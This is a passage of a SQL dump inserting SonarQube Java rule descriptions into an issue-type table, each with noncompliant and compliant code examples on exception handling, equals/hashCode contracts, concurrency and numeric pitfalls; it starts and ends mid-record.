<p>By definition, extending the Thread class without overriding the <code>run</code> method doesn''t make sense, and implies that the contract of the
<code>Thread</code> class is not well understood.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyRunner extends Thread { // Noncompliant; run method not overridden

  public void doSometing() {...}
}
</pre>
<h2>Exceptions</h2>
<p>If <code>run()</code> is not overridden in a class extending <code>Thread</code>, it means that starting the thread will actually call
<code>Thread.run()</code>. However, <code>Thread.run()</code> does nothing if it has not been fed with a target <code>Runnable</code>. The rule
consequently ignore classes extending <code>Thread</code> if they are calling, in their constructors, the <code>super(...)</code> constructor with a
proper <code>Runnable</code> target.</p>
<pre>
class MyThread extends Thread { // Compliant - calling super constructor with a Runnable
  MyThread(Runnable target) {
    super(target); // calling super constructor with a Runnable, which will be used for when Thread.run() is executed
    // ...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2139', 'Exceptions should be either logged or rethrown but not both', 'sonarqube', 'Code Smell', '<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain
multiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from
other threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or
rethrown, not both.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  throw new MySQLException(contextInfo, e);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (SQLException e) {
  ...
  throw new MySQLException(contextInfo, e);
}
</pre>
<p>or </p>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  // handle exception...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2140', 'Methods of "Random" that return floating point values should not be used in random integer generation', 'sonarqube', 'Code Smell', '<p>There is no need to multiply the output of <code>Random</code>''s <code>nextDouble</code> method to get a random integer. Use the
<code>nextInt</code> method instead.</p>
<p>This rule raises an issue when the return value of any of <code>Random</code>''s methods that return a floating point value is converted to an
integer.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Random r = new Random();
int rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50
int rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
Random r = new Random();
int rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2141', 'Classes that don''t define "hashCode()" should not be used in hashes', 'sonarqube', 'Bug', '<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define
<code>equals(Object)</code> but not <code>hashCode()</code> aren''t truly hash-able because instances that are equivalent according to the
<code>equals</code> method can return different hashes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Student {  // no hashCode() method; not hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = // okay so far
          new HashTable&lt;Student, Integer&gt;(); // Noncompliant

  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Student {  // has hashCode() method; hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
  public int hashCode() {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();

  // ...
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2142', '"InterruptedException" should not be ignored', 'sonarqube', 'Bug', '<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as "ignoring". The
throwing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact
that the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up
the method''s state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a
single-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -
probably without finishing its task.</p>
<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>
<blockquote>
  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) { // Noncompliant; logging is not enough
    LOGGER.log(Level.WARN, "Interrupted!", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) {
    LOGGER.log(Level.WARN, "Interrupted!", e);
    // Restore interrupted state...
    Thread.currentThread().interrupt();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> <a href="https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1">Dealing with InterruptedException</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2143', '"java.time" classes should be used for dates and times', 'sonarqube', 'Code Smell', '<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in
a multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8''s JSR 310
implementation offers specific classes for:</p>
<table>
  <tbody>
    <tr>
      <th>Class</th>
      <th>Use for</th>
    </tr>
    <tr>
      <td>LocalDate</td>
      <td>a date, without time of day, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalTime</td>
      <td>the time of day, without date, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalDateTime</td>
      <td>the date and time, without offset, or zone</td>
    </tr>
    <tr>
      <td>OffsetDate</td>
      <td>a date with an offset such as +02:00, without time of day, or zone</td>
    </tr>
    <tr>
      <td>OffsetTime</td>
      <td>the time of day with an offset such as +02:00, without date, or zone</td>
    </tr>
    <tr>
      <td>OffsetDateTime</td>
      <td>the date and time with an offset such as +02:00, without a zone</td>
    </tr>
    <tr>
      <td>ZonedDateTime</td>
      <td>the date and time with a time zone and offset</td>
    </tr>
    <tr>
      <td>YearMonth</td>
      <td>a year and month</td>
    </tr>
    <tr>
      <td>MonthDay</td>
      <td>month and day</td>
    </tr>
    <tr>
      <td>Year/MonthOfDay/DayOfWeek/...</td>
      <td>classes for the important fields</td>
    </tr>
    <tr>
      <td>DateTimeFields</td>
      <td>stores a map of field-value pairs which may be invalid</td>
    </tr>
    <tr>
      <td>Calendrical</td>
      <td>access to the low-level API</td>
    </tr>
    <tr>
      <td>Period</td>
      <td>a descriptive amount of time, such as "2 months and 3 days"</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
Date now = new Date();  // Noncompliant
DateFormat df = new SimpleDateFormat("dd.MM.yyyy");
Calendar christmas  = Calendar.getInstance();  // Noncompliant
christmas.setTime(df.parse("25.12.2020"));
</pre>
<h2>Compliant Solution</h2>
<pre>
LocalDate now = LocalDate.now();  // gets calendar date. no time component
LocalTime now2 = LocalTime.now(); // gets current time. no date component
LocalDate christmas = LocalDate.of(2020,12,25);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2147', 'Catches should be combined', 'sonarqube', 'Code Smell', '<p>Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple <code>catch</code> blocks have the same code, they
should be combined for better readability.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (IOException e) {
  doCleanup();
  logger.log(e);
}
catch (SQLException e) {  // Noncompliant
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {  // Compliant; block contents are different
  doCleanup();
  throw e;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (IOException|SQLException e) {
  doCleanup();
  logger.log(e);
}
catch (TimeoutException e) {
  doCleanup();
  throw e;
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2148', 'Underscores should be used to make large numbers readable', 'sonarqube', 'Code Smell', '<p>Beginning with Java 7, it is possible to add underscores (''_'') to numeric literals to enhance readability. The addition of underscores in this
manner has no semantic meaning, but makes it easier for maintainers to understand the code.</p>
<p>The number of digits to the left of a decimal point needed to trigger this rule varies by base.</p>
<table>
  <tbody>
    <tr>
      <th>Base</th>
      <th> Minimum digits</th>
    </tr>
    <tr>
      <td>binary</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>octal</td>
      <td> 9 </td>
    </tr>
    <tr>
      <td>decimal</td>
      <td> 6 </td>
    </tr>
    <tr>
      <td>hexadecimal</td>
      <td> 9 </td>
    </tr>
  </tbody>
</table>
<p>It is only the presence of underscores, not their spacing that is scrutinized by this rule.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 10000000;  // Noncompliant; is this 10 million or 100 million?
int  j = 0b01101001010011011110010101011110;  // Noncompliant
long l = 0x7fffffffffffffffL;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i = 10_000_000;
int  j = 0b01101001_01001101_11100101_01011110;
long l = 0x7fff_ffff_ffff_ffffL;
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2151', '"runFinalizersOnExit" should not be called', 'sonarqube', 'Bug', '<p>Running finalizers on JVM exit is disabled by default. It can be enabled with <code>System.runFinalizersOnExit</code> and
<code>Runtime.runFinalizersOnExit</code>, but both methods are deprecated because they are are inherently unsafe. </p>
<p>According to the Oracle Javadoc:</p>
<blockquote>
  <p>It may result in finalizers being called on live objects while other threads are concurrently manipulating those objects, resulting in erratic
  behavior or deadlock.</p>
</blockquote>
<p>If you really want to be execute something when the virtual machine begins its shutdown sequence, you should attach a shutdown hook. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String [] args) {
  ...
  System.runFinalizersOnExit(true);  // Noncompliant
  ...
}

protected void finalize(){
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String [] args) {
  Runtime.addShutdownHook(new Runnable() {
    public void run(){
      doSomething();
    }
  });
  //...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/4jZGBQ">CERT, MET12-J.</a> - Do not use finalizers </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2153', 'Boxing and unboxing should not be immediately reversed', 'sonarqube', 'Bug', '<p>Boxing is the process of putting a primitive value into an analogous object, such as creating an <code>Integer</code> to hold an <code>int</code>
value. Unboxing is the process of retrieving the primitive value from such an object.</p>
<p>Since the original value is unchanged during boxing and unboxing, there''s no point in doing either when not needed. This also applies to autoboxing
and auto-unboxing (when Java implicitly handles the primitive/object transition for you).</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = new Double(d).intValue(); // Noncompliant

  examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox
  examineInt(Integer.valueOf(i));  // Noncompliant; boxed int will be auto-unboxed

  examineInteger(i); // Compliant; value is boxed but not then unboxed
  examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed

  Integer iger2 = new Integer(iger1); // Noncompliant; unnecessary unboxing, value can be reused
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void examineInt(int a) {
  //...
}

public void examineInteger(Integer a) {
  // ...
}

public void func() {
  int i = 0;
  Integer iger1 = Integer.valueOf(0);
  double d = 1.0;

  int dIntValue = (int) d;

  examineInt(i);

  examineInteger(i);
  examineInteger(iger1);
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2154', 'Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting', 'sonarqube', 'Bug', '<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both
values will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? (Number) i : f;  // n = 123456789
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2156', '"final" classes should not have "protected" members', 'sonarqube', 'Code Smell', '<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>
members, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a
<code>final</code> class <code>protected</code> is confusingly pointless.</p>
<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this
could lead to accidental, unintended access to otherwise private members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public final class MyFinalClass {

  protected String name = "Fred";  // Noncompliant
  protected void setName(String name) {  // Noncompliant
    // ...
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class MyFinalClass {

  private String name = "Fred";
  public void setName(String name) {
    // ...
  }
</pre>
<h2>Exceptions</h2>
<p>Members annotated with&nbsp;<code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed to
make the code testable.</p>
<pre>
public final class MyFinalClass {
  @VisibleForTesting
  protected Logger logger; // Compliant

  @VisibleForTesting
  protected int calculateSomethingComplex(String input) { // Compliant
    // ...
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2157', '"Cloneables" should implement "clone"', 'sonarqube', 'Code Smell', '<p>Simply implementing <code>Cloneable</code> without also overriding <code>Object.clone()</code> does not necessarily make the class cloneable. While
the <code>Cloneable</code> interface does not include a <code>clone</code> method, it is required by convention, and ensures true cloneability.
Otherwise the default JVM <code>clone</code> will be used, which copies primitive values and object references from the source to the target. I.e.
without overriding <code>clone</code>, any cloned instances will potentially share members with the source instance.</p>
<p>Removing the <code>Cloneable</code> implementation and providing a good copy constructor is another viable (some say preferable) way of allowing a
class to be copied.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Team implements Cloneable {  // Noncompliant
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) {...}
  public Person getCoach() {...}
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Team implements Cloneable {
  private Person coach;
  private List&lt;Person&gt; players;
  public void addPlayer(Person p) { ... }
  public Person getCoach() { ... }

  @Override
  public Object clone() {
    Team clone = (Team) super.clone();
    //...
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2159', 'Silly equality checks should not be made', 'sonarqube', 'Bug', '<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>
<ul>
  <li> comparing an object with null </li>
  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>
  <li> comparing unrelated classes </li>
  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>
  <li> comparing unrelated <code>interface</code> types </li>
  <li> comparing an array to a non-array </li>
  <li> comparing two arrays </li>
</ul>
<p>Specifically in the case of arrays, since arrays don''t override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same
as comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>
<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for
instance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be
used with arrays.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface KitchenTool { ... };
interface Plant {...}

public class Spatula implements KitchenTool { ... }
public class Tree implements Plant { ...}
//...

Spatula spatula = new Spatula();
KitchenTool tool = spatula;
KitchenTool [] tools = {tool};

Tree tree = new Tree();
Plant plant = tree;
Tree [] trees = {tree};


if (spatula.equals(tree)) { // Noncompliant; unrelated classes
  // ...
}
else if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface
  // ...
}
else if (tool.equals(plant)) { // Noncompliant; unrelated interfaces
  // ...
}
else if (tool.equals(tools)) { // Noncompliant; array &amp; non-array
  // ...
}
else if (trees.equals(tools)) { // Noncompliant; incompatible arrays
  // ...
}
else if (tree.equals(null)) { // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/5zdGBQ">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two arrays </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2160', 'Subclasses that add fields should override "equals"', 'sonarqube', 'Code Smell', '<p>Extend a class that overrides <code>equals</code> and add fields without overriding <code>equals</code> in the subclass, and you run the risk of
non-equivalent instances of your subclass being seen as equal, because only the superclass fields will be considered in the equality test.</p>
<p>This rule looks for classes that do all of the following:</p>
<ul>
  <li> extend classes that override <code>equals</code>. </li>
  <li> do not themselves override <code>equals</code>. </li>
  <li> add fields. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {  // Noncompliant; instances will use Fruit''s equals method
  private Color ripeColor;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (this.class != obj.class) {
      return false;
    }
    Fruit fobj = (Fruit) obj;
    if (ripe.equals(fobj.getRipe()) {
      return true;
    }
    return false;
  }
}

public class Raspberry extends Fruit {
  private Color ripeColor;

  public boolean equals(Object obj) {
    if (! super.equals(obj)) {
      return false;
    }
    Raspberry fobj = (Raspberry) obj;
    if (ripeColor.equals(fobj.getRipeColor()) {  // added fields are tested
      return true;
    }
    return false;
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2162', '"equals" methods should be symmetric and work for subclasses', 'sonarqube', 'Bug', '<p>A key facet of the <code>equals</code> contract is that if <code>a.equals(b)</code> then <code>b.equals(a)</code>, i.e. that the relationship is
symmetric. </p>
<p>Using <code>instanceof</code> breaks the contract when there are subclasses, because while the child is an <code>instanceof</code> the parent, the
parent is not an <code>instanceof</code> the child. For instance, assume that <code>Raspberry extends Fruit</code> and adds some fields (requiring a
new implementation of <code>equals</code>):</p>
<pre>
Fruit fruit = new Fruit();
Raspberry raspberry = new Raspberry();

if (raspberry instanceof Fruit) { ... } // true
if (fruit instanceof Raspberry) { ... } // false
</pre>
<p>If similar <code>instanceof</code> checks were used in the classes'' <code>equals</code> methods, the symmetry principle would be broken:</p>
<pre>
raspberry.equals(fruit); // false
fruit.equals(raspberry); //true
</pre>
<p>Additionally, non <code>final</code> classes shouldn''t use a hardcoded class name in the <code>equals</code> method because doing so breaks the
method for subclasses. Instead, make the comparison dynamic.</p>
<p>Further, comparing to an unrelated class type breaks the contract for that unrelated type, because while
<code>thisClass.equals(unrelatedClass)</code> can return true, <code>unrelatedClass.equals(thisClass)</code> will not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (Fruit.class == obj.getClass()) { // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    if (obj instanceof Fruit ) {  // Noncompliant; broken for child classes
      return ripe.equals(((Fruit)obj).getRipe());
    }
    else if (obj instanceof Season) { // Noncompliant; symmetry broken for Season class
      // ...
    }
    //...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit extends Food {
  private Season ripe;

  public boolean equals(Object obj) {
    if (obj == this) {
      return true;
    }
    if (obj == null) {
      return false;
    }
    if (this.getClass() == obj.getClass()) {
      return ripe.equals(((Fruit)obj).getRipe());
    }
    return false;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/AzZGBQ">CERT, MET08-J.</a> - Preserve the equality contract when overriding the equals() method
  </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2164', 'Math should not be performed on floats', 'sonarqube', 'Bug', '<p>For small numbers, <code>float</code> math has enough precision to yield the expected value, but for larger numbers, it does not.
<code>BigDecimal</code> is the best alternative, but if a primitive is required, use a <code>double</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
float c = a + b; // Noncompliant; yields 1.6777216E7 not 1.6777217E7

double d = a + b; // Noncompliant; addition is still between 2 floats
</pre>
<h2>Compliant Solution</h2>
<pre>
float a = 16777216.0f;
float b = 1.0f;
BigDecimal c = BigDecimal.valueOf(a).add(BigDecimal.valueOf(b));

double d = (double)a + (double)b;
</pre>
<h2>Exceptions</h2>
<p>This rule doesn''t raise an issue when the mathematical expression is only used to build a string.</p>
<pre>
System.out.println("["+getName()+"] " +
           "
	Max time to retrieve connection:"+(max/1000f/1000f)+" ms.");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/CtcxBQ">CERT, FLP02-C.</a> - Avoid using floating-point numbers when precise computation is
  needed </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2165', '"finalize" should not set fields to "null"', 'sonarqube', 'Code Smell', '<p>There is no point in setting class fields to <code>null</code> in a finalizer. If this this is a hint to the garbage collector, it is unnecessary -
the object will be garbage collected anyway - and doing so may actually cause extra work for the garbage collector.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private String name;

  @Override
  void finalize() {
    name = null;  // Noncompliant; completely unnecessary
  }
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2166', 'Classes named like "Exception" should extend "Exception" or a subclass', 'sonarqube', 'Code Smell', '<p>Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code.
Using "exception" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation
that a class'' name will indicate what it is and/or does.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class FruitException {  // Noncompliant; this has nothing to do with Exception
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException {  // Noncompliant; the extends clause was forgotten?
  public CarException(String message, Throwable cause) {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class FruitSport {
  private Fruit expected;
  private String unusualCharacteristics;
  private boolean appropriateForCommercialExploitation;
  // ...
}

public class CarException extends Exception {
  public CarException(String message, Throwable cause) {
  // ...
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2167', '"compareTo" should not return "Integer.MIN_VALUE"', 'sonarqube', 'Bug', '<p>It is the sign, rather than the magnitude of the value returned from <code>compareTo</code> that matters. Returning <code>Integer.MIN_VALUE</code>
does <em>not</em> convey a higher degree of inequality, and doing so can cause errors because the return value of <code>compareTo</code> is sometimes
inversed, with the expectation that negative values become positive. However, inversing <code>Integer.MIN_VALUE</code> yields
<code>Integer.MIN_VALUE</code> rather than <code>Integer.MAX_VALUE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return Integer.MIN_VALUE;  // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
public int compareTo(MyClass) {
  if (condition) {
    return -1;
  }
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2168', 'Double-checked locking should not be used', 'sonarqube', 'Bug', '<p>Double-checked locking is the practice of checking a lazy-initialized object''s state both before and after a <code>synchronized</code> block is
entered to determine whether or not to initialize the object.</p>
<p>It does not work reliably in a platform-independent manner without additional synchronization for mutable instances of anything other than
<code>float</code> or <code>int</code>. Using double-checked locking for the lazy initialization of any other type of primitive or mutable object
risks a second thread using an uninitialized or partially initialized member while the first thread is still creating it, and crashing the
program.</p>
<p>There are multiple ways to fix this. The simplest one is to simply not use double checked locking at all, and synchronize the whole method instead.
With early versions of the JVM, synchronizing the whole method was generally advised against for performance reasons. But <code>synchronized</code>
performance has improved a lot in newer JVMs, so this is now a preferred solution. If you prefer to avoid using <code>synchronized</code> altogether,
you can use an inner <code>static class</code> to hold the reference instead. Inner static classes are guaranteed to load lazily.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@NotThreadSafe
public class DoubleCheckedLocking {
    private static Resource resource;

    public static Resource getInstance() {
        if (resource == null) {
            synchronized (DoubleCheckedLocking.class) {
                if (resource == null)
                    resource = new Resource();
            }
        }
        return resource;
    }

    static class Resource {

    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@ThreadSafe
public class SafeLazyInitialization {
    private static Resource resource;

    public static synchronized Resource getInstance() {
        if (resource == null)
            resource = new Resource();
        return resource;
    }

    static class Resource {
    }
}
</pre>
<p>With inner static holder:</p>
<pre>
@ThreadSafe
public class ResourceFactory {
    private static class ResourceHolder {
        public static Resource resource = new Resource(); // This will be lazily initialised
    }

    public static Resource getResource() {
        return ResourceFactory.ResourceHolder.resource;
    }

    static class Resource {
    }
}
</pre>
<p>Using "volatile":</p>
<pre>
class ResourceFactory {
  private volatile Resource resource;

  public Resource getResource() {
    Resource localResource = resource;
    if (localResource == null) {
      synchronized (this) {
        localResource = resource;
        if (localResource == null) {
          resource = localResource = new Resource();
        }
      }
    }
    return localResource;
  }

  static class Resource {
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html">The "Double-Checked Locking is Broken" Declaration</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6zdGBQ">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/609.html">MITRE, CWE-609</a> - Double-checked locking </li>
  <li> <a href="https://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.4">JLS 12.4</a> - Initialization of Classes and Interfaces </li>
  <li> Wikipedia: <a href="https://en.wikipedia.org/wiki/Double-checked_locking#Usage_in_Java">Double-checked locking</a> </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2175', 'Inappropriate "Collection" calls should not be made', 'sonarqube', 'Bug', '<p>The <code>java.util.Collection</code> API has methods that accept <code>Object</code> parameters such as <code>Collection.remove(Object o)</code>,
and <code>Collection.contains(Object o)</code>. When the actual type of the object provided to these methods is not consistent with the type declared
on the <code>Collection</code> instantiation, those methods will always return <code>false</code> or <code>null</code>. This is most likely unintended
and hides a design problem.</p>
<p>This rule raises an issue when the type of the argument of the following APIs is unrelated to the type used for the <code>Collection</code>
declaration:</p>
<ul>
  <li> <code>Collection.remove(Object o)</code> </li>
  <li> <code>Collection.removeAll(Collection&lt;?&gt;)</code> </li>
  <li> <code>Collection.contains(Object o)</code> </li>
  <li> <code>List.indexOf(Object o)</code> </li>
  <li> <code>List.lastIndexOf(Object o)</code> </li>
  <li> <code>Map.containsKey(Object key)</code> </li>
  <li> <code>Map.containsValue(Object value)</code> </li>
  <li> <code>Map.get(Object key)</code> </li>
  <li> <code>Map.getOrDefault(Object key, V defaultValue)</code> </li>
  <li> <code>Map.remove(Object key)</code> </li>
  <li> <code>Map.remove(Object key, Object value)</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class S2175 {

  public static void main(String[] args) {
